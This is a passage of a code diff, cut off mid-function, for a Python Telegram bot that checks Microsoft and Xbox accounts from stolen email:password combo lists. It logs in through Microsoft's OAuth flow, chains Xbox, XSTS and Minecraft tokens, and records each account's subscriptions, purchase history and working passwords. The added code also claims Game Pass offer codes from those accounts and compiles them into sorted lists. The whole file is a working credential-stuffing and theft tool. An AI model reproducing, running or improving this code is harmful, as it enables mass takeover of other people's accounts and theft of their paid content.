@@ -1,573 +1,893 @@
+#!/usr/bin/env python3
+"""
+METAL PULLER - TELEGRAM BOT EDITION
+Designed for high performance execution on Railway via environmental variables.
+Features: Pulling, Validation, Sorting, Live UI updates every 5 seconds, 
+Thread control (40-50 workers), custom safe mechanisms, and asynchronous execution.
+Language: English
+"""
+
 import os
+import sys
 import re
-import time
-import uuid
 import json
+import time
+import random
+import string
+import uuid
+import queue
 import threading
-import concurrent.futures
-import io
+import asyncio
 from datetime import datetime
-import requests
-import urllib3
-import warnings
-import telebot
-from telebot import types
-from requests.adapters import HTTPAdapter
-from urllib3.util import Retry
+from urllib.parse import urlparse, parse_qs
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
-# ==========================================
-# ⚙️ INITIAL SETTINGS & WARNINGS
-# ==========================================
-urllib3.disable_warnings()
-warnings.filterwarnings("ignore")
+# Try to import external dependencies safely
+try:
+    import requests
+except ImportError:
+    print("Critical Error: 'requests' library is not installed. Run 'pip install requests'")
+    sys.exit(1)
 
-BOT_TOKEN = os.getenv("BOT_TOKEN")
-OWNER_ID = int(os.getenv("OWNER_ID", "8664147577"))
+try:
+    from aiogram import Bot, Dispatcher, F, types
+    from aiogram.filters import Command
+    from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, BufferedInputFile
+    from aiogram.fsm.context import FSMContext
+    from aiogram.fsm.state import State, StatesGroup
+    from aiogram.fsm.storage.memory import MemoryStorage
+except ImportError:
+    print("Critical Error: 'aiogram' (v3.x) library is not installed. Run 'pip install aiogram'")
+    sys.exit(1)
 
-# En kararlı bot tanımı
-bot = telebot.TeleBot(BOT_TOKEN)
-panel_lock = threading.Lock()
+# ============================================================================
+# RAILWAY CONFIGURATION & ENVIRONMENT VARIABLES
+# ============================================================================
+BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
+OWNER_ID = os.getenv("OWNER_ID", "YOUR_TELEGRAM_ID_HERE")
 
-# Ağ kopmalarına karşı en katı istek koruması
-session_tg = requests.Session()
-retries = Retry(total=5, backoff_factor=1, status_forcelist=[500, 502, 503, 504])
-session_tg.mount("https://", HTTPAdapter(max_retries=retries))
-
-def safe_bot_call(func, *args, **kwargs):
-    try:
-        return func(*args, **kwargs)
-    except Exception as e:
-        print(f"[⚠️ TELEGRAM API HATASI]: {e}")
-        return None
-
-# ==========================================
-# 💾 DATABASE / STORAGE EMULATION
-# ==========================================
-DATA_FILE = "bot_data.json"
-if os.path.exists(DATA_FILE):
-    with open(DATA_FILE, "r", encoding="utf-8") as f:
-        db = json.load(f)
+if OWNER_ID.isdigit():
+    OWNER_ID = int(OWNER_ID)
 else:
-    db = {"admins": [OWNER_ID], "users": {}, "keys": {}, "channels": []}
+    print("Warning: OWNER_ID env variable is not a valid integer. Check your Railway configuration.")
 
-def save_db():
-    with open(DATA_FILE, "w", encoding="utf-8") as f:
-        json.dump(db, f, ensure_ascii=False, indent=4)
+# ============================================================================
+# GLOBAL DATA STRUCTURES & LOCKS
+# ============================================================================
+print_lock = threading.Lock()
+results_lock = threading.Lock()
 
-if OWNER_ID not in db["admins"]:
-    db["admins"].append(OWNER_ID)
-    save_db()
-
-# ==========================================
-# 🌍 LOCALIZATION & KEYBOARDS
-# ==========================================
-LANG = {
-    "tr": {
-        "welcome": "👋 *Metal Checker Botuna Hoş Geldiniz!* \n\nLütfen devam etmek için bir dil seçin:",
-        "main_menu": "📱 *Ana Menü* \n\nBir işlem seçiniz:",
-        "btn_check": "🚀 Hesap Tara (.txt)",
-        "btn_merge": "📂 Dosya Birleştir",
-        "btn_stats": "📊 İstatistiklerim",
-        "btn_lang": "🌐 Dil Değiştir (Language)",
-        "scan_started": "🚀 Tarama başlatıldı! Canlı panel anlık olarak akacaktır.",
-    },
-    "en": {
-        "welcome": "👋 *Welcome to Metal Checker Bot!* \n\nPlease choose a language to continue:",
-        "main_menu": "📱 *Main Menu* \n\nPlease choose an option:",
-        "btn_check": "🚀 Scan Accounts (.txt)",
-        "btn_merge": "📂 Merge Files",
-        "btn_stats": "📊 My Statistics",
-        "btn_lang": "🌐 Change Language",
-        "scan_started": "🚀 Scan started! Dashboard is updating live.",
-    }
-}
-
-def get_text(user_id, key):
-    lang = db["users"].get(str(user_id), {}).get("lang", "en")
-    return LANG[lang].get(key, key)
-
-def lang_keyboard():
-    markup = types.InlineKeyboardMarkup()
-    markup.row(types.InlineKeyboardButton("Türkçe 🇹🇷", callback_data="set_lang_tr"),
-               types.InlineKeyboardButton("English 🇺🇸", callback_data="set_lang_en"))
-    return markup
-
-def main_keyboard(user_id):
-    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
-    markup.row(get_text(user_id, "btn_check"), get_text(user_id, "btn_merge"))
-    markup.row(get_text(user_id, "btn_stats"), get_text(user_id, "btn_lang"))
-    return markup
-
-# ==========================================
-# 🧠 MICROSOFT & XBOX CORE AUTH ENGINE
-# ==========================================
-SFTAG_URL = (
-    "https://login.live.com/oauth20_authorize.srf"
-    "?client_id=00000000402B5328"
-    "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
-    "&scope=service::user.auth.xboxlive.com::MBI_SSL"
-    "&display=touch&response_type=token&locale=en"
+MICROSOFT_OAUTH_URL = (
+    'https://login.live.com/oauth20_authorize.srf'
+    '?client_id=00000000402B5328'
+    '&redirect_uri=https://login.live.com/oauth20_desktop.srf'
+    '&scope=service::user.auth.xboxlive.com::MBI_SSL'
+    '&display=touch&response_type=token&locale=en'
 )
 
-def get_sftag(session):
-    try:
-        response = session.get(SFTAG_URL, timeout=10)
-        text     = response.text
-        match    = re.search(r'value=\\\"(.+?)\\\"', text, re.S) or re.search(r'value="(.+?)"', text, re.S)
-        if match:
-            sftag = match.group(1)
-            match = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
-            if match: return match.group(1), sftag
-    except: pass
-    return None, None
+# Active tasks repository for real-time progress tracking
+ACTIVE_TASKS = {}
 
-def microsoft_auth(session, email, password, url_post, sftag):
-    try:
-        data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sftag}
-        login_request = session.post(url_post, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=10)
-        if '#' in login_request.url and login_request.url != SFTAG_URL:
-            from urllib.parse import urlparse, parse_qs
-            token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ["None"])[0]
-            if token != "None": return token, "success"
-        elif 'cancel?mkt=' in login_request.text:
-            try:
-                d = {
-                    'ipt':   re.search('(?<=\"ipt\" value=\").+?(?=\">)', login_request.text).group(),
-                    'pprid': re.search('(?<=\"pprid\" value=\").+?(?=\">)', login_request.text).group(),
-                    'uaid':  re.search('(?<=\"uaid\" value=\").+?(?=\">)', login_request.text).group()
-                }
-                action_url = re.search('(?<=id=\"fmHF\" action=\").+?(?=\" )', login_request.text).group()
-                ret        = session.post(action_url, data=d, allow_redirects=True, timeout=10)
-                return_url = re.search('(?<=\"recoveryCancel\":{\"returnUrl\":\").+?(?=\",)', ret.text).group()
-                fin        = session.get(return_url, allow_redirects=True, timeout=10)
-                token      = parse_qs(urlparse(fin.url).fragment).get('access_token', ["None"])[0]
-                if token != "None": return token, "success"
-            except: pass
-        elif any(v in login_request.text for v in ["recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/Abuse?mkt="]):
-            return None, "2fa"
-        elif any(v in login_request.text.lower() for v in ["password is incorrect", "account doesn't exist", "sign in to your microsoft account", "tried to sign in too many times"]):
-            return None, "bad"
-    except: pass
-    return None, "error"
+class BotStates(StatesGroup):
+    waiting_for_accounts_check_validation = State()
+    waiting_for_accounts_check_only = State()
+    waiting_for_codes_to_sort = State()
 
-def get_xbox_token(session, ms_token):
-    try:
-        payload  = {"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}
-        response = session.post('https://user.auth.xboxlive.com/user/authenticate', json=payload, headers={'Content-Type': 'application/json'}, timeout=10)
-        if response.status_code == 200:
-            data = response.json()
-            return data.get('Token'), data['DisplayClaims']['xui'][0]['uhs']
-    except: pass
-    return None, None
+# ============================================================================
+# INTERIOR CORE ARCHITECTURE - HELPER ENGINE
+# ============================================================================
+def generate_reference_id():
+    timestamp_val = int(time.time() // 30)
+    n = f'{timestamp_val:08X}'
+    o = (uuid.uuid4().hex + uuid.uuid4().hex).upper()
+    result_chars = []
+    for e in range(64):
+        if e % 8 == 1:
+            result_chars.append(n[(e - 1) // 8])
+        else:
+            result_chars.append(o[e])
+    return "".join(result_chars)
 
-def get_xsts_token(session, xbox_token):
-    try:
-        payload  = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}
-        response = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=payload, headers={'Content-Type': 'application/json'}, timeout=10)
-        if response.status_code == 200: return response.json().get('Token')
-    except: pass
-    return None
+def extract_game_type(game_name):
+    game_name = game_name.upper()
+    if 'SUNSET SARSAPARILLA' in game_name:
+        return '🥤 Sunset Sarsaparilla Bundle'
+    elif 'RAINBOW SIX SIEGE' in game_name:
+        return '🔫 Rainbow Six Siege'
+    elif 'SKATE' in game_name:
+        return '🛹 Skate Supercharge Pack'
+    elif 'MADDEN NFL' in game_name:
+        return '🏈 Madden NFL Supercharge Pack'
+    elif 'WARFRAME' in game_name:
+        return '⚔️ Warframe Bundle'
+    elif 'THRONE AND LIBERTY' in game_name:
+        return '👑 Throne and Liberty'
+    elif 'DRIFT BUNDLE' in game_name:
+        return '🚗 Drift Bundle'
+    elif 'WINTER' in game_name and 'XBOX BENEFITS' in game_name:
+        return '❄️ Winter Xbox Benefits Pack'
+    elif 'JANG SAO' in game_name:
+        return '🏆 Jang Sao Champions Bundle'
+    elif 'PSO2:NGS' in game_name or 'PHANTASY STAR' in game_name:
+        return '⭐ PSO2:NGS Monthly Bonus'
+    elif 'XBOX GAME PASS' in game_name:
+        return '🎮 Xbox Game Pass'
+    elif 'BUNDLE' in game_name:
+        return '🎁 Game Bundle'
+    elif 'PACK' in game_name:
+        return '📦 Game Pack'
+    else:
+        return '🎮 Other Games'
 
-def get_minecraft_token(session, uhs, xsts_token):
-    try:
-        response = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"}, headers={'Content-Type': 'application/json'}, timeout=10)
-        if response.status_code == 200: return response.json().get('access_token')
-    except: pass
-    return None
-
-def check_entitlements(session, mc_token):
-    found_subs = []
-    main_type = None
-    try:
-        response = session.get('https://api.minecraftservices.com/entitlements/mcstore', headers={'Authorization': f'Bearer {mc_token}'}, timeout=10)
-        if response.status_code == 200:
-            text = response.text
-            text_lower = text.lower()
+def format_game_codes_output(game_groups):
+    lines = []
+    sorted_groups = sorted(game_groups.items(), key=lambda x: (-len(x[1]), x[0]))
+    
+    lines.append("🎮 METAL PULLER - SORTED GAME CODES 🎮")
+    lines.append("=" * 60)
+    lines.append("")
+    
+    total_codes = 0
+    code_counts_global = 0
+    
+    for game_type, codes_list in sorted_groups:
+        count = len(codes_list)
+        total_codes += count
+        
+        lines.append(f"📋 {game_type} ({count} codes)")
+        lines.append("-" * 50)
+        
+        codes_list.sort(key=lambda x: x[0])
+        code_counts = {}
+        for code, game_name in codes_list:
+            if code not in code_counts:
+                code_counts[code] = []
+            code_counts[code].append(game_name)
             
-            days_left_str = ""
-            expiry_match = re.search(r'"expirydate"\s*:\s*"([^"]+)"', text_lower) or re.search(r'"enddate"\s*:\s*"([^"]+)"', text_lower)
-            if expiry_match:
-                try:
-                    exp_raw = expiry_match.group(1).split("t")[0]
-                    diff = (datetime.strptime(exp_raw, "%Y-%m-%d") - datetime.now()).days
-                    days_left_str = f" ({diff}G Kaldı)" if diff > 0 else " (Süresi Bitmiş)"
-                except: pass
-
-            if 'product_game_pass_ultimate' in text_lower or 'ultimate' in text_lower: found_subs.append(f"Game Pass Ultimate💎{days_left_str}")
-            elif 'product_game_pass_pc' in text_lower or 'pc_game_pass' in text_lower: found_subs.append(f"Game Pass PC💻{days_left_str}")
-            elif 'essential' in text_lower: found_subs.append(f"Game Pass Essential🟢{days_left_str}")
-            elif 'standard' in text_lower: found_subs.append(f"Game Pass Standard🎮{days_left_str}")
-            elif 'core' in text_lower or 'xbox_live_gold' in text_lower: found_subs.append(f"Game Pass Core⚙️{days_left_str}")
-            
-            if 'family' in text_lower: found_subs.append("Microsoft 365 Family")
-            if 'personal' in text_lower or 'bireysel' in text_lower: found_subs.append("Microsoft 365 Personal")
-            if 'business' in text_lower: found_subs.append("Microsoft 365 Business")
-            if 'onedrive' in text_lower: found_subs.append("OneDrive Storage")
-            if 'clipchamp' in text_lower: found_subs.append("Clipchamp Premium")
-            if 'ea play' in text_lower or 'ea_membership' in text_lower: found_subs.append("EA Play")
-            if 'ubisoft' in text_lower: found_subs.append("Ubisoft+")
-            if 'riot' in text_lower: found_subs.append("Riot Games Perks")
-            if 'gta' in text_lower: found_subs.append("GTA+")
-            if 'fallout 1st' in text_lower: found_subs.append("Fallout 1st")
-            if 'visual studio' in text_lower or 'msdn' in text_lower: found_subs.append("Visual Studio Sub")
-            if 'azure' in text_lower: found_subs.append("Azure Credits 🚀")
-            if 'copilot' in text_lower: found_subs.append("GitHub Copilot")
-            if 'developer' in text_lower: found_subs.append("Xbox Dev Account")
-            if 'realms' in text_lower: found_subs.append("Minecraft Realms")
-            if 'windows 365' in text_lower: found_subs.append("Windows 365 Cloud")
-            if 'casual games' in text_lower: found_subs.append("Casual Games Premium")
-
-            if 'product_game_pass_ultimate' in text: main_type = 'Xbox Game Pass Ultimate'
-            elif 'product_game_pass_pc' in text: main_type = 'Xbox Game Pass'
-            elif '"product_minecraft"' in text: main_type = 'Minecraft'
-    except: pass
-    return main_type, found_subs
-
-def get_xbox_profile(session, uhs, xsts_token):
-    try:
-        response = session.get("https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag,AccountTier", headers={"Authorization": f"XBL3.0 x={uhs};{xsts_token}", "x-xbl-contract-version": "2", "Accept": "application/json"}, timeout=10)
-        if response.status_code == 200:
-            settings = {s["id"]: s.get("value", "N/A") for s in response.json().get("profileUsers", [{}])[0].get("settings", [])}
-            return {"gamertag": settings.get("Gamertag", "N/A"), "tier": settings.get("AccountTier", "N/A")}
-    except: pass
-    return {"gamertag": "N/A", "tier": "N/A"}
-
-def get_payment_transactions(session, ms_token):
-    try:
-        url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions"
-        response = session.get(url, headers={"Authorization": f"Bearer {ms_token}", "Accept": "application/json"}, timeout=10)
-        if response.status_code == 200:
-            games = []
-            for item in response.json().get("transactions", []):
-                title = item.get("description") or item.get("productName")
-                if title: games.append(title)
-            return list(set(games))
-    except: pass
-    return []
-
-# ==========================================
-# 🔄 CONTEXT STATE MANAGEMENT
-# ==========================================
-active_scans = {}
-user_game_filter = {}
-
-class BotScanContext:
-    def __init__(self, chat_id, user_id, combos, filter_str="skip"):
-        self.chat_id = chat_id
-        self.user_id = user_id
-        self.combos = combos
-        self.total = len(combos)
-        self.checked = 0
-        self.hits = 0
-        self.bad = 0
-        self.twofa = 0
-        self.errors = 0
-
-        # Canlı Panel Sayaç Odaları
-        self.gp_ultimate = 0
-        self.gp_pc = 0
-        self.gp_essential = 0
-        self.gp_standard = 0
-        self.gp_core = 0
-        self.m365_family = 0
-        self.m365_personal = 0
-        self.m365_business = 0
-        self.onedrive = 0
-        self.clipchamp = 0
-        self.eaplay = 0
-        self.ubisoft = 0
-        self.riot = 0
-        self.gta = 0
-        self.fallout = 0
-        self.vstudio = 0
-        self.azure = 0
-        self.copilot = 0
-        self.dev_acc = 0
-        self.realms = 0
-        self.win355 = 0
-        self.casual = 0
-        self.minecraft_java = 0
-
-        self.hit_list = []
-        self.bad_list = []
-        self.twofa_list = []
-        self.not_linked_list = []
-        self.purchased_items_list = [] 
-        self.subscriptions_list = [] 
-
-        self.filter_str = filter_str.lower().strip()
-        self.is_running = True
-        self.lock = threading.Lock()
-        self.message_id = None
-
-def check_account_bot(context, combo):
-    if not context.is_running: return
-    try:
-        parts = combo.strip().split(':')
-        if len(parts) < 2:
-            with context.lock: context.bad += 1; context.checked += 1
-            return
-
-        email, password = parts[0], ':'.join(parts[1:])
-        session = requests.Session()
-        session.verify = False
-
-        url_post, sftag = get_sftag(session)
-        if not url_post or not sftag: raise Exception("sftag")
-
-        ms_token, auth_status = microsoft_auth(session, email, password, url_post, sftag)
-        if auth_status == "2fa":
-            with context.lock: context.twofa += 1; context.checked += 1; context.twofa_list.append(combo)
-            return
-        elif auth_status == "bad":
-            with context.lock: context.bad += 1; context.checked += 1; context.bad_list.append(combo)
-            return
-        elif auth_status != "success" or not ms_token: raise Exception("ms")
-
-        xbox_token, uhs = get_xbox_token(session, ms_token)
-        if not xbox_token or not uhs: raise Exception("xbox")
-
-        xsts_token = get_xsts_token(session, xbox_token)
-        if not xsts_token: raise Exception("xsts")
-
-        xbox_profile = get_xbox_profile(session, uhs, xsts_token)
-        mc_token = get_minecraft_token(session, uhs, xsts_token)
-        if not mc_token: raise Exception("mc")
-
-        account_type, subs = check_entitlements(session, mc_token)
-        purchased_games = get_payment_transactions(session, ms_token)
-
-        if context.filter_str != "skip":
-            if not any(context.filter_str in g.lower() for g in purchased_games):
-                with context.lock: context.checked += 1
-                return
-
-        has_premium_sub = len(subs) > 0
-        has_any_game = len(purchased_games) > 0
-
-        capture_detail = (
-            f"Email         : {email}\nPassword      : {password}\n"
-            f"Gamertag      : {xbox_profile.get('gamertag')}\nTier          : {xbox_profile.get('tier')}\n"
-            f"Subscriptions : {', '.join(subs) if has_premium_sub else 'None'}\nGames Count   : {len(purchased_games)}\n{'='*50}"
-        )
-
-        with context.lock:
-            context.checked += 1
-            if not has_premium_sub and not has_any_game:
-                context.not_linked_list.append(capture_detail)
+        code_counts_global += len(code_counts)
+        
+        for code, game_names in sorted(code_counts.items()):
+            if len(game_names) == 1:
+                lines.append(f"{code} | {game_names[0]}")
             else:
-                context.hits += 1
-                context.hit_list.append(f"{email}:{password}")
-                
-                # Sadece oyunu olanlar purchased_items'a
-                if has_any_game:
-                    games_str = "\n".join([f"{i} - {g}" for i, g in enumerate(purchased_games, 1)])
-                    context.purchased_items_list.append(f"Email: {email}\nPassword: {password}\nGamesList:\n{games_str}\n— Checker by Icardi\n{'='*50}\n")
+                lines.append(f"{code} (x{len(game_names)}) | {game_names[0]}")
+                for game_name in game_names[1:]:
+                    lines.append(f"{' ' * (len(code) + 3)}| {game_name}")
+        lines.append("")
+    
+    lines.append("📊 SUMMARY REPORT")
+    lines.append("=" * 60)
+    lines.append(f"Total Unique Codes Discovered: {code_counts_global}")
+    lines.append(f"Total Code Entries Logged: {total_codes}")
+    lines.append(f"Game Categories Processed: {len(game_groups)}")
+    lines.append(f"Generated on: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} UTC")
+    
+    return "\n".join(lines) + "\n"
 
-                # Sadece aboneliği olanlar Subscriptions'a
-                if has_premium_sub:
-                    sub_entry = f"Email: {email} | Pass: {password}\nActive Subscriptions:\n" + "\n".join([f" ➡️ {sb}" for sb in subs]) + f"\n{'-'*40}\n"
-                    context.subscriptions_list.append(sub_entry)
+# ============================================================================
+# PARSING MECHANICS FOR ACCOUNTS AND INPUTS
+# ============================================================================
+def parse_accounts_data(text_data: str):
+    accounts = []
+    lines = text_data.split('\n')
+    for line in lines:
+        line = line.strip()
+        if line and ':' in line and not line.startswith('#'):
+            parts = line.split(':', 1)
+            accounts.append((parts[0].strip(), parts[1].strip()))
+    return accounts
 
-            if account_type and 'Minecraft' in account_type: context.minecraft_java += 1
-            for s in subs:
-                sl = s.lower()
-                if "ultimate" in sl: context.gp_ultimate += 1
-                elif "pc" in sl: context.gp_pc += 1
-                elif "essential" in sl: context.gp_essential += 1
-                elif "standard" in sl: context.gp_standard += 1
-                elif "core" in sl or "gold" in sl: context.gp_core += 1
-                elif "family" in sl: context.m365_family += 1
-                elif "personal" in sl: context.m365_personal += 1
-                elif "business" in sl: context.m365_business += 1
-                elif "onedrive" in sl: context.onedrive += 1
-                elif "clipchamp" in sl: context.clipchamp += 1
-                elif "ea play" in sl: context.eaplay += 1
-                elif "ubisoft" in sl: context.ubisoft += 1
-                elif "riot" in sl: context.riot += 1
-                elif "gta" in sl: context.gta += 1
-                elif "fallout" in sl: context.fallout += 1
-                elif "visual studio" in sl: context.vstudio += 1
-                elif "azure" in sl: context.azure += 1
-                elif "copilot" in sl: context.copilot += 1
-                elif "developer" in sl: context.dev_acc += 1
-                elif "realms" in sl: context.realms += 1
-                elif "windows 365" in sl: context.win355 += 1
-                elif "casual" in sl: context.casual += 1
+# ============================================================================
+# FETCHER BACKEND ENGINE - MS AUTHENTICATION
+# ============================================================================
+def fetch_oauth_tokens(session):
+    try:
+        response = session.get(MICROSOFT_OAUTH_URL, timeout=5)
+        text = response.text
+        match = re.search(r'value=\\\"(.+?)\\\"', text, re.S) or re.search(r'value="(.+?)"', text, re.S)
+        if not match: return (None, None)
+        ppft = match.group(1)
+        match = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
+        if not match: return (None, None)
+        return (match.group(1), ppft)
     except:
-        with context.lock: context.errors += 1; context.checked += 1
+        return (None, None)
 
-def generate_panel_text(context):
-    pct = (context.checked / context.total) * 100 if context.total > 0 else 0
-    return (
-        f"⚡ *METAL CHECKER ANLIK PANEL v5.0* ⚡\n"
-        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"🟢 Hit (Oyun/Sub'lı): `{context.hits}`\n"
-        f"🔴 Hatalı (Bad): `{context.bad}`\n"
-        f"🟡 İki Faktör (2FA): `{context.twofa}`\n"
-        f"⚠️ Hata (Error): `{context.errors}`\n"
-        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"📊 *ANLIK ABONELİK & OYUN DETAYLARI* 📊\n"
-        f"💎 Game Pass Ultimate: `{context.gp_ultimate}`\n"
-        f"💻 Game Pass PC: `{context.gp_pc}`\n"
-        f"🟢 Game Pass Essential: `{context.gp_essential}`\n"
-        f"🎮 Game Pass Standard: `{context.gp_standard}`\n"
-        f"⚙️ Game Pass Core/Gold: `{context.gp_core}`\n"
-        f"🟩 Minecraft Java/Capes: `{context.minecraft_java}`\n"
-        f"📦 Microsoft 365 Family: `{context.m365_family}`\n"
-        f"👤 Microsoft 365 Personal: `{context.m365_personal}`\n"
-        f"🏢 Microsoft 365 Business: `{context.m365_business}`\n"
-        f"☁️ OneDrive Storage: `{context.onedrive}`\n"
-        f"🎬 Clipchamp Premium: `{context.clipchamp}`\n"
-        f"🎮 EA Play: `{context.eaplay}`\n"
-        f"🦅 Ubisoft+: `{context.ubisoft}`\n"
-        f"🔥 Riot Games Perks: `{context.riot}`\n"
-        f"🚗 GTA+: `{context.gta}`\n"
-        f"☢️ Fallout 1st: `{context.fallout}`\n"
-        f"💻 Visual Studio Sub: `{context.vstudio}`\n"
-        f"🚀 Azure Credits: `{context.azure}`\n"
-        f"🤖 GitHub Copilot: `{context.copilot}`\n"
-        f"🛠️ Xbox Dev Account: `{context.dev_acc}`\n"
-        f"🧱 Minecraft Realms: `{context.realms}`\n"
-        f"🖥️ Windows 365 Cloud: `{context.win355}`\n"
-        f"🎲 Casual Games Prem: `{context.casual}`\n"
-        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"📈 İlerleme: `[{context.checked}/{context.total}]` — `% {pct:.1f}`"
-    )
+def fetch_login(session, email, password, url_post, ppft):
+    try:
+        resp = session.post(url_post, data={'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': ppft},
+                           headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=5)
+        if '#' in resp.url:
+            token = parse_qs(urlparse(resp.url).fragment).get('access_token', ['None'])[0]
+            if token != 'None': return token
+        if 'cancel?mkt=' in resp.text:
+            ipt = re.search(r'(?<="ipt" value=").+?(?=">)', resp.text)
+            pprid = re.search(r'(?<="pprid" value=").+?(?=">)', resp.text)
+            uaid = re.search(r'(?<="uaid" value=").+?(?=">)', resp.text)
+            action = re.search(r'(?<=id="fmHF" action=").+?(?=" )', resp.text)
+            if ipt and pprid and uaid and action:
+                ret = session.post(action.group(), data={'ipt': ipt.group(), 'pprid': pprid.group(), 'uaid': uaid.group()}, allow_redirects=True, timeout=5)
+                return_url = re.search(r'(?<="recoveryCancel":{"returnUrl":")+.+?(?=",)', ret.text)
+                if return_url:
+                    fin = session.get(return_url.group(), allow_redirects=True, timeout=5)
+                    if '#' in fin.url:
+                        token = parse_qs(urlparse(fin.url).fragment).get('access_token', ['None'])[0]
+                        if token != 'None': return token
+        return None
+    except:
+        return None
 
-def live_refresh_loop(context):
-    """⏱️ Telegram 400 Bad Request (can't be edited) hatalarını engelleyen zırhlı döngü"""
-    last_text = ""
-    while context.is_running and context.checked < context.total:
-        text = generate_panel_text(context)
+def get_xbox_tokens(session, rps_token):
+    try:
+        resp = session.post('https://user.auth.xboxlive.com/user/authenticate',
+            json={'RelyingParty': 'http://auth.xboxlive.com', 'TokenType': 'JWT',
+                  'Properties': {'AuthMethod': 'RPS', 'SiteName': 'user.auth.xboxlive.com', 'RpsTicket': rps_token}},
+            headers={'Content-Type': 'application/json'}, timeout=5)
+        if resp.status_code != 200: return (None, None)
+        user_token = resp.json().get('Token')
         
-        # 🛡️ KRİTİK KONTROL: Sadece metin bir öncekiyle tamamen farklıysa edit isteği at
-        if text != last_text and context.message_id:
-            with panel_lock:
-                try:
-                    bot.edit_message_text(
-                        text, 
-                        chat_id=context.chat_id, 
-                        message_id=context.message_id, 
-                        parse_mode="Markdown"
-                    )
-                    last_text = text  # Sadece başarıyla editlendiyse hafızayı güncelle
-                except telebot.apihelper.ApiTelegramException as e:
-                    # 'message can't be edited' veya 'message is not modified' hatası gelirse yut gitsin.
-                    if "message can't be edited" in e.description or "message is not modified" in e.description:
-                        pass
-                    else:
-                        print(f"[⚠️ DÖNGÜ HATASI]: {e}")
-            
-        time.sleep(3.0) # Tam istediğin gibi 3 saniyede bir ekranı tazeleyecek altın oran
+        resp = session.post('https://xsts.auth.xboxlive.com/xsts/authorize',
+            json={'RelyingParty': 'http://xboxlive.com', 'TokenType': 'JWT',
+                  'Properties': {'UserTokens': [user_token], 'SandboxId': 'RETAIL'}},
+            headers={'Content-Type': 'application/json'}, timeout=5)
+        if resp.status_code != 200: return (None, None)
+        data = resp.json()
+        return (data.get('DisplayClaims', {}).get('xui', [{}])[0].get('uhs'), data.get('Token'))
+    except:
+        return (None, None)
 
-    # Tarama tamamen bittiğinde son durumu basıyoruz
-    text = generate_panel_text(context)
-    with panel_lock:
+def fetch_codes_from_xbox(session, uhs, xsts_token):
+    try:
+        auth = f'XBL3.0 x={uhs};{xsts_token}'
+        resp = session.get('https://profile.gamepass.com/v2/offers',
+            headers={'Authorization': auth, 'Content-Type': 'application/json', 'User-Agent': 'okhttp/4.12.0'}, timeout=5)
+        if resp.status_code != 200: return []
+        
+        codes = []
+        for offer in resp.json().get('offers', []):
+            resource = offer.get('resource')
+            if resource:
+                codes.append(resource)
+            elif offer.get('offerStatus') == 'available':
+                cv = ''.join(random.choices(string.ascii_letters + string.digits, k=22)) + '.0'
+                claim_resp = session.post(f'https://profile.gamepass.com/v2/offers/{offer.get("offerId")}',
+                    headers={'Authorization': auth, 'content-type': 'application/json', 'User-Agent': 'okhttp/4.12.0', 'ms-cv': cv, 'Content-Length': '0'},
+                    data='', timeout=5)
+                if claim_resp.status_code == 200:
+                    code = claim_resp.json().get('resource')
+                    if code: codes.append(code)
+        return codes
+    except:
+        return []
+
+def fetch_account_worker_standalone(email, password):
+    session = requests.Session()
+    session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
+    try:
+        url_post, ppft = fetch_oauth_tokens(session)
+        if not url_post: return False, [], "Auth failed"
+        
+        rps = fetch_login(session, email, password, url_post, ppft)
+        if not rps: return False, [], "Login failed"
+        
+        uhs, xsts = get_xbox_tokens(session, rps)
+        if not uhs: return False, [], "Xbox tokens failed"
+        
+        codes = fetch_codes_from_xbox(session, uhs, xsts)
+        return True, codes, f"Success ({len(codes)} codes)"
+    except Exception as e:
+        return False, [], f"Error: {str(e)}"
+    finally:
+        session.close()
+
+# ============================================================================
+# VALIDATOR BACKEND ENGINE - MS CORE DYNAMICS CHECKER
+# ============================================================================
+def login_microsoft_account(email, password):
+    session = requests.Session()
+    session.headers = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+        'Accept-Language': 'en-US,en;q=0.9',
+        'Referer': 'https://account.microsoft.com/',
+        'Origin': 'https://account.microsoft.com',
+        'Upgrade-Insecure-Requests': '1',
+    }
+    try:    
+        login_response = session.post(
+            f"https://login.live.com/ppsecure/post.srf?username={email}&client_id=81feaced-5ddd-41e7-8bef-3e20a2689bb7&contextid=833A37B454306173&opid=81A1AC2B0BEB4ABA&bk=1761964181&uaid=f8aac2614ca54994b0bb9621af361fe6&pid=15216&prompt=none",
